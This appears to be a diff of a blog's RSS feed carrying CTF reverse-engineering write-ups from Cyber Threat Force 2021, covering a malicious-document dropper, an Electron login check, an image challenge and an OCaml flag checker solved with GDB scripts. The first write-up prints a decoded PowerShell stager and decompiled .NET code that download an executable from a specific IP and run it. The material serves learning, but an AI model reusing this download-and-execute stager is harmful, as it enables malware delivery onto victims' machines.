+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ echo &lt;span style="color:#e6db74">&amp;#39;JABQAHIAbwBjAE4AYQBtAGUAIAA9ACAAIgBwAGEAdABjAGgALgBlAHgAZQAiAA0ACgAkAFcAZQBiAEYAaQBsAGUAIAA9ACAAIgBoAHQAdABwADoALwAvADEANQAyAC4AMgAyADgALgAxADMAMwAuADYAOAAvACQAUAByAG8AYwBOAGEAbQBlACIADQAKACAADQAKACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAFcAZQBiAEYAaQBsAGUALAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA0ACgBTAHQAYQByAHQALQBQAHIAbwBjAGUAcwBzACAAKAAiACQAZQBuAHYAOgBBAFAAUABEAEEAVABBAFwAJABQAHIAbwBjAE4AYQBtAGUAIgApAA==&amp;#39;&lt;/span> | base64 -d
 $ProcName &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;patch.exe&amp;#34;&lt;/span>
 $WebFile &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;http://152.228.133.68/&lt;/span>$ProcName&lt;span style="color:#e6db74">&amp;#34;&lt;/span>
 &lt;span style="color:#f92672">(&lt;/span>New-Object System.Net.WebClient&lt;span style="color:#f92672">)&lt;/span>.DownloadFile&lt;span style="color:#f92672">(&lt;/span>$WebFile,&lt;span style="color:#e6db74">&amp;#34;&lt;/span>$env&lt;span style="color:#e6db74">:APPDATA\$ProcName&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
 Start-Process &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>$env&lt;span style="color:#e6db74">:APPDATA\$ProcName&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>OK so a &lt;code>patch.exe&lt;/code> file is downloaded, and executed. Let&amp;rsquo;s take a look:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ wget http://152.228.133.68/patch.exe
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ wget http://152.228.133.68/patch.exe
 $ file patch.exe
 patch.exe: PE32 executable &lt;span style="color:#f92672">(&lt;/span>console&lt;span style="color:#f92672">)&lt;/span> Intel &lt;span style="color:#ae81ff">80386&lt;/span> Mono/.Net assembly, &lt;span style="color:#66d9ef">for&lt;/span> MS Windows
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>It&amp;rsquo;s a .NET program, we can use &lt;a href="https://github.com/icsharpcode/ILSpy">ILSpy&lt;/a> to analyze it. It only contains a bit of code:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cs" data-lang="cs">&lt;span style="color:#75715e">// @Ӕ
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cs" data-lang="cs">&lt;span style="color:#75715e">// @Ӕ
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">using&lt;/span> System;
 &lt;span style="color:#66d9ef">using&lt;/span> System.IO;
 &lt;span style="color:#66d9ef">using&lt;/span> System.Net;
@@ -273,7 +273,7 @@ Console.WriteLine(&lt;span style="color:#66d9ef">new&lt;/span> StreamReader(webR
 }
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s take a look at that payload:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl http://152.228.133.68/staged_payload.txt
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ curl http://152.228.133.68/staged_payload.txt
 CYBERTF&lt;span style="color:#f92672">{&lt;/span>M4cr0_D0wnl0ad3r_1s_D0wn&lt;span style="color:#f92672">}&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we go, the flag is &lt;code>CYBERTF{M4cr0_D0wnl0ad3r_1s_D0wn}&lt;/code>.&lt;/p>
 &lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/the-document-is-strange">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Smasher</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-smasher/</link><pubDate>Sat, 10 Jul 2021 02:50:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-smasher/</guid><description>For this challenge, we were given two files:
@@ -287,7 +287,7 @@ function Login() { var i = { _keyStr: &amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefg
 &lt;p>I only looked at the AppImage one, since I&amp;rsquo;m running linux. Launching the program reveals an electron app:&lt;/p>
 &lt;p>&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/smasher.png" alt="The application">&lt;/p>
 &lt;p>We can simply use the dev tools to reveal the source code. Only one javascript file is there, &lt;code>login.js&lt;/code>:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">Login&lt;/span>() {
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">Login&lt;/span>() {
 &lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {
 &lt;span style="color:#ae81ff">_&lt;/span>&lt;span style="color:#a6e22e">keyStr&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#e6db74">&amp;#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&amp;#34;&lt;/span>,
 &lt;span style="color:#a6e22e">encode&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span>(&lt;span style="color:#a6e22e">r&lt;/span>) {
@@ -339,7 +339,7 @@ isNaN(&lt;span style="color:#a6e22e">t&lt;/span>) &lt;span style="color:#f92672"
 &lt;span style="color:#a6e22e">location&lt;/span>.&lt;span style="color:#a6e22e">replace&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;#34;&lt;/span>)) &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#a6e22e">alert&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;wrong password&amp;#34;&lt;/span>)
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>That bottom string is compared with the password that we can enter, and looks like base64. Let&amp;rsquo;s try to decode it:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#a6e22e">atob&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;Q1lCRVJURntNMFIzX04zZzR0MXYzX3RoNG5fNF9wcjB0MG59&amp;#39;&lt;/span>)
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#a6e22e">atob&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;Q1lCRVJURntNMFIzX04zZzR0MXYzX3RoNG5fNF9wcjB0MG59&amp;#39;&lt;/span>)
 &lt;span style="color:#e6db74">&amp;#34;CYBERTF{M0R3_N3g4t1v3_th4n_4_pr0t0n}&amp;#34;&lt;/span>
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>And so we have our flag: &lt;code>CYBERTF{M0R3_N3g4t1v3_th4n_4_pr0t0n}&lt;/code>.&lt;/p>
 &lt;p>Note that I didn&amp;rsquo;t flag this during the CTF, my teammate &lt;a href="https://ctftime.org/user/46515">R0ck3t&lt;/a> did.&lt;/p>
@@ -361,7 +361,7 @@ Trying to download the first image gives us a PE file. If we upload it again, we
 &lt;hr>
 &lt;p>When I did not find any message encoded in the image, I started looking at the binary itself. It&amp;rsquo;s a Mono/.Net program, probably obfuscated using something like &lt;a href="https://www.gapotchenko.com/eazfuscator.net">Eazfuscator&lt;/a>. I say that because &lt;a href="https://github.com/icsharpcode/ILSpy">ILSpy&lt;/a>, a .NET decompiler, spits out mangled function names, encoded strings, &amp;hellip;&lt;/p>
 &lt;p>The function responsible for downloading the second stage is this one:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cs" data-lang="cs">&lt;span style="color:#75715e">// \u0005\u2000
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cs" data-lang="cs">&lt;span style="color:#75715e">// \u0005\u2000
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">using&lt;/span> System;
 &lt;span style="color:#66d9ef">using&lt;/span> System.Diagnostics;
 &lt;span style="color:#66d9ef">using&lt;/span> System.Net;
@@ -400,14 +400,14 @@ WindowStyle = ProcessWindowStyle.Hidden
 &lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/verify-this">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Flag checker</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-flag-checker/</link><pubDate>Fri, 09 Jul 2021 00:01:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-flag-checker/</guid><description>For this challenge, we were given a program executable.
 $ ./program ./program FLAG $ ./program MYFLAG failed Seems like it valides the flag that is passed as an argument. Let&amp;rsquo;s open the binary in Ghidra.
 There are a lot of functions defined, and looking at the exports we see that quite a lot of them start with caml_. I didn&amp;rsquo;t know you could compile OCaml to C, that&amp;rsquo;s pretty neat.</description><content>&lt;p>For this challenge, we were given a &lt;code>program&lt;/code> executable.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ ./program
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ ./program
 ./program FLAG
 $ ./program MYFLAG
 failed
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Seems like it valides the flag that is passed as an argument. Let&amp;rsquo;s open the binary in Ghidra.&lt;/p>
 &lt;p>There are a lot of functions defined, and looking at the exports we see that quite a lot of them start with &lt;code>caml_&lt;/code>. I didn&amp;rsquo;t know you could compile OCaml to C, that&amp;rsquo;s pretty neat.&lt;/p>
 &lt;p>We can pinpoint the function that checks the flag by searching for strings. After looking for the event&amp;rsquo;s flag format, &lt;code>CYBERTF{...}&lt;/code>, we find a fake flag: &lt;code>CYBERTF{Not-S0Easy-Fake-Flag}&lt;/code>. One function references it:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined8 &lt;span style="color:#a6e22e">camlReverse__entry&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">undefined8 &lt;span style="color:#a6e22e">camlReverse__entry&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>) {
 &lt;span style="color:#66d9ef">long&lt;/span> lVar1;
 byte bVar2;
 &lt;span style="color:#66d9ef">long&lt;/span> lVar3;
@@ -468,7 +468,7 @@ camlStdlib__print_endline_361();
 caml_ml_array_bound_error();
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>We can understand the general flow from the functions names alone. First:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Convert the passed flag from a string to (probably custom using structs) char array.
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Convert the passed flag from a string to (probably custom using structs) char array.
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>camlReverse__string2char_211();
 &lt;span style="color:#75715e">// Map each char to its int value.
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>camlReverse__char2int_207();
@@ -480,7 +480,7 @@ camlStdlib__print_endline_361();
 &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>;
 }
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>And then:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Subtract a value from some variable, probably shifting an array (the flag?).
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">// Subtract a value from some variable, probably shifting an array (the flag?).
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>camlStdlib__bytes__sub_115((lVar1 &lt;span style="color:#f92672">-&lt;/span> (ulong)bVar2) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">0x13&lt;/span>);
 &lt;span style="color:#75715e">// Print something.
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>camlStdlib__print_endline_361();
@@ -501,7 +501,7 @@ camlStdlib__print_endline_361();
 &lt;/span>&lt;span style="color:#75715e">&lt;/span>camlStdlib__print_endline_361();
 camlStdlib__exit_459();
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Once again, let&amp;rsquo;s take the easy route. We&amp;rsquo;ll extract the flag using GDB, by looking at the check functions.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">...
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">...
 gef➤ disassemble camlReverse__firstCheck_268
 Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> camlReverse__firstCheck_268:
 0x0000555555574100 &amp;lt;+0&amp;gt;: sub rsp,0x18
@@ -538,7 +538,7 @@ Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span sty
 0x000055555557416d &amp;lt;+109&amp;gt;: ret
 End of assembler dump.
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The function looks like a simple character check in a loop. Let&amp;rsquo;s confirm this by looking at the parameters passed to &lt;code>caml_c_call&lt;/code> (used to call &lt;code>caml_equal&lt;/code>).&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ b *0x0000555555574126
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ b *0x0000555555574126
 Breakpoint &lt;span style="color:#ae81ff">1&lt;/span> at 0x555555574126
 gef➤ r ABCDEFG
 gef➤ p $rdi
@@ -546,13 +546,13 @@ $1 &lt;span style="color:#f92672">=&lt;/span> 0x83
 gef➤ p $rsi
 $2 &lt;span style="color:#f92672">=&lt;/span> 0x87
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The values don&amp;rsquo;t match. Let&amp;rsquo;s run it again with the known flag format:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ r CYBERTF
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ r CYBERTF
 gef➤ p $rdi
 $1 &lt;span style="color:#f92672">=&lt;/span> 0x87
 gef➤ p $rsi
 $2 &lt;span style="color:#f92672">=&lt;/span> 0x87
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The values match. Hitting &lt;code>continue&lt;/code> brings us to the next comparison. Let&amp;rsquo;s script this out:&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> string
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> string
 alphabet &lt;span style="color:#f92672">=&lt;/span> (
 &lt;span style="color:#e6db74">&amp;#39;_&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
 string&lt;span style="color:#f92672">.&lt;/span>ascii_lowercase &lt;span style="color:#f92672">+&lt;/span>
@@ -561,13 +561,13 @@ string&lt;span style="color:#f92672">.&lt;/span>digits &lt;span style="color:#f9
 string&lt;span style="color:#f92672">.&lt;/span>punctuation
 )
 found &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
-running &lt;span style="color:#f92672">=&lt;/span> True
+running &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
 &lt;span style="color:#66d9ef">while&lt;/span> running:
 &lt;span style="color:#66d9ef">for&lt;/span> char &lt;span style="color:#f92672">in&lt;/span> alphabet:
 &lt;span style="color:#75715e"># To avoid substitution errors, skip &amp;#39;.&lt;/span>
 &lt;span style="color:#66d9ef">if&lt;/span> char &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>:
 &lt;span style="color:#66d9ef">continue&lt;/span>
-&lt;span style="color:#66d9ef">print&lt;/span>(found &lt;span style="color:#f92672">+&lt;/span> char)
+print(found &lt;span style="color:#f92672">+&lt;/span> char)
 &lt;span style="color:#75715e"># Run the program.&lt;/span>
 gdb&lt;span style="color:#f92672">.&lt;/span>execute(&lt;span style="color:#e6db74">&amp;#34;r &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> found &lt;span style="color:#f92672">+&lt;/span> char &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>)
 &lt;span style="color:#75715e"># Skip over the first N chars we already found.&lt;/span>
@@ -578,20 +578,20 @@ gdb&lt;span style="color:#f92672">.&lt;/span>execute(&lt;span style="color:#e6db
 rdi &lt;span style="color:#f92672">=&lt;/span> int(gdb&lt;span style="color:#f92672">.&lt;/span>parse_and_eval(&lt;span style="color:#e6db74">&amp;#34;$rdi&amp;#34;&lt;/span>))
 rsi &lt;span style="color:#f92672">=&lt;/span> int(gdb&lt;span style="color:#f92672">.&lt;/span>parse_and_eval(&lt;span style="color:#e6db74">&amp;#34;$rsi&amp;#34;&lt;/span>))
 &lt;span style="color:#66d9ef">except&lt;/span>:
-running &lt;span style="color:#f92672">=&lt;/span> False
+running &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
 &lt;span style="color:#66d9ef">break&lt;/span>
 &lt;span style="color:#66d9ef">if&lt;/span> rdi &lt;span style="color:#f92672">==&lt;/span> rsi:
 found &lt;span style="color:#f92672">+=&lt;/span> char
 &lt;span style="color:#66d9ef">break&lt;/span>
 &lt;span style="color:#66d9ef">else&lt;/span>:
 &lt;span style="color:#66d9ef">break&lt;/span>
-&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;=&amp;gt;&amp;#39;&lt;/span>, found)
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ source extract_start.py
+print(&lt;span style="color:#e6db74">&amp;#39;=&amp;gt;&amp;#39;&lt;/span>, found)
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ source extract_start.py
 ...
 &lt;span style="color:#f92672">[&lt;/span>Inferior &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">(&lt;/span>process 1287983&lt;span style="color:#f92672">)&lt;/span> exited normally&lt;span style="color:#f92672">]&lt;/span>
 &lt;span style="color:#f92672">=&lt;/span>&amp;gt; CYBERTF&lt;span style="color:#f92672">{&lt;/span>Go
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>After a few seconds, we get the start of the flag: &lt;code>CYBERTF{Go&lt;/code>. Now let&amp;rsquo;s look at the other function. We&amp;rsquo;ll assume it checks the remaining part of the flag.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ disassemble camlReverse__listequal_92
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ disassemble camlReverse__listequal_92
 Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> camlReverse__listequal_92:
 0x0000555555573e20 &amp;lt;+0&amp;gt;: sub rsp,0x18
 0x0000555555573e24 &amp;lt;+4&amp;gt;: cmp rax,0x1
@@ -627,7 +627,7 @@ Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span sty
 0x0000555555573e8d &amp;lt;+109&amp;gt;: ret
 End of assembler dump.
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>We have the same pattern here, let&amp;rsquo;s just quickly adapt the script.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> string
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> string
 alphabet &lt;span style="color:#f92672">=&lt;/span> (
 &lt;span style="color:#e6db74">&amp;#39;_&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span>
 string&lt;span style="color:#f92672">.&lt;/span>ascii_lowercase &lt;span style="color:#f92672">+&lt;/span>
@@ -637,13 +637,13 @@ string&lt;span style="color:#f92672">.&lt;/span>punctuation
 )
 found &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;CYBERTF{Go&amp;#39;&lt;/span>
 start_len &lt;span style="color:#f92672">=&lt;/span> len(found)
-running &lt;span style="color:#f92672">=&lt;/span> True
+running &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>
 &lt;span style="color:#66d9ef">while&lt;/span> running:
 &lt;span style="color:#66d9ef">for&lt;/span> char &lt;span style="color:#f92672">in&lt;/span> alphabet:
 &lt;span style="color:#75715e"># To avoid substitution errors, skip &amp;#39;.&lt;/span>
 &lt;span style="color:#66d9ef">if&lt;/span> char &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>:
 &lt;span style="color:#66d9ef">continue&lt;/span>
-&lt;span style="color:#66d9ef">print&lt;/span>(found &lt;span style="color:#f92672">+&lt;/span> char)
+print(found &lt;span style="color:#f92672">+&lt;/span> char)
 &lt;span style="color:#75715e"># Run the program.&lt;/span>
 gdb&lt;span style="color:#f92672">.&lt;/span>execute(&lt;span style="color:#e6db74">&amp;#34;r &amp;#39;&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> found &lt;span style="color:#f92672">+&lt;/span> char &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>)
 &lt;span style="color:#75715e"># Skip over the first N chars we already found.&lt;/span>
@@ -654,15 +654,15 @@ gdb&lt;span style="color:#f92672">.&lt;/span>execute(&lt;span style="color:#e6db
 rdi &lt;span style="color:#f92672">=&lt;/span> int(gdb&lt;span style="color:#f92672">.&lt;/span>parse_and_eval(&lt;span style="color:#e6db74">&amp;#34;$rdi&amp;#34;&lt;/span>))
 rsi &lt;span style="color:#f92672">=&lt;/span> int(gdb&lt;span style="color:#f92672">.&lt;/span>parse_and_eval(&lt;span style="color:#e6db74">&amp;#34;$rsi&amp;#34;&lt;/span>))
 &lt;span style="color:#66d9ef">except&lt;/span>:
-running &lt;span style="color:#f92672">=&lt;/span> False
+running &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">False&lt;/span>
 &lt;span style="color:#66d9ef">break&lt;/span>
 &lt;span style="color:#66d9ef">if&lt;/span> rdi &lt;span style="color:#f92672">==&lt;/span> rsi:
 found &lt;span style="color:#f92672">+=&lt;/span> char
 &lt;span style="color:#66d9ef">break&lt;/span>
 &lt;span style="color:#66d9ef">else&lt;/span>:
 &lt;span style="color:#66d9ef">break&lt;/span>
-&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;=&amp;gt;&amp;#39;&lt;/span>, found)
-&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ &lt;span style="color:#75715e"># Remove the previous breakpoint first.&lt;/span>
+print(&lt;span style="color:#e6db74">&amp;#39;=&amp;gt;&amp;#39;&lt;/span>, found)
+&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">gef➤ &lt;span style="color:#75715e"># Remove the previous breakpoint first.&lt;/span>
 gef➤ del &lt;span style="color:#ae81ff">1&lt;/span>
 gef➤ d *0x0000555555573e46
 Breakpoint &lt;span style="color:#ae81ff">2&lt;/span> at 0x555555573e46
@@ -675,7 +675,7 @@ gef➤ source extract_end.py
 &lt;h2 id="additional-notes">Additional notes&lt;/h2>
 &lt;p>I&amp;rsquo;ve been wanting to learn about Ghidra&amp;rsquo;s python API for a while now, so I decided after writing the post above to take a deeper look at how things are implemented, and to write a script that&amp;rsquo;ll extract the flag.&lt;/p>
 &lt;p>Let&amp;rsquo;s first check out &lt;code>camlReverse__string2char_211&lt;/code>, by breaking right before it is called.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ gdb ./program
